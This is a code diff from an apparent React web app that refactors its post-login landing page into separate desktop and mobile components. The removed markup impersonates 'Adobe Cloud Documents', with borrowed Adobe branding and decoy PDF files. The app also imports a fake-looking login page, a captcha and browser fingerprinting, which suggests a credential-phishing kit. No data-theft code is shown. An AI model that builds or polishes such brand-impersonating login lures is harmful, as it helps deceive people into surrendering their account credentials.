@@ -1,6 +1,8 @@
 import React, { useState, useEffect } from 'react';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
+import LandingPage from './components/LandingPage';
+import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import { 
   getBrowserFingerprint, 
@@ -520,70 +522,16 @@ function App() {
     );
   }
 
-  // Landing page - show when user has active session
+  // Landing page - use appropriate component based on device
   if (hasActiveSession && currentPage === 'landing') {
+    const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
+    
     return (
-      <div className="min-h-screen bg-gray-100">
-        <div className="bg-white shadow-sm border-b">
-          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div className="flex justify-between items-center py-4">
-              <div className="flex items-center">
-                <img
-                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
-                  alt="Adobe Cloud"
-                  className="w-8 h-8 mr-3"
-                />
-                <h1 className="text-xl font-semibold text-gray-900">Adobe Cloud Documents</h1>
-              </div>
-              <button 
-                onClick={handleLogout}
-                className="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors"
-              >
-                Sign Out
-              </button>
-            </div>
-          </div>
-        </div>
-
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
-          <div className="bg-white rounded-lg shadow p-6">
-            <h2 className="text-2xl font-bold text-gray-900 mb-6">Welcome to Adobe Cloud</h2>
-            <p className="text-gray-600 mb-4">Your documents are ready to access.</p>
-            
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-              {['Document1.pdf', 'Presentation.pdf', 'Contract.pdf'].map((fileName) => (
-                <div key={fileName} className="border rounded-lg p-4 hover:shadow-md transition-shadow">
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center">
-                      <div className="w-10 h-10 bg-red-100 rounded-lg flex items-center justify-center mr-3">
-                        <span className="text-red-600 font-semibold text-sm">PDF</span>
-                      </div>
-                      <div>
-                        <h3 className="font-medium text-gray-900">{fileName}</h3>
-                        <p className="text-sm text-gray-500">Adobe PDF Document</p>
-                      </div>
-                    </div>
-                    <div className="flex space-x-2">
-                      <button 
-                        onClick={() => handleFileAction(fileName, 'view')}
-                        className="text-blue-600 hover:text-blue-800 text-sm"
-                      >
-                        View
-                      </button>
-                      <button 
-                        onClick={() => handleFileAction(fileName, 'download')}
-                        className="text-green-600 hover:text-green-800 text-sm"
-                      >
-                        Download
-                      </button>
-                    </div>
-                  </div>
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
-      </div>
+      <LandingComponent
+        selectedFileName={selectedFileName}
+        onFileAction={handleFileAction}
+        onLogout={handleLogout}
+      />
     );
   }
 
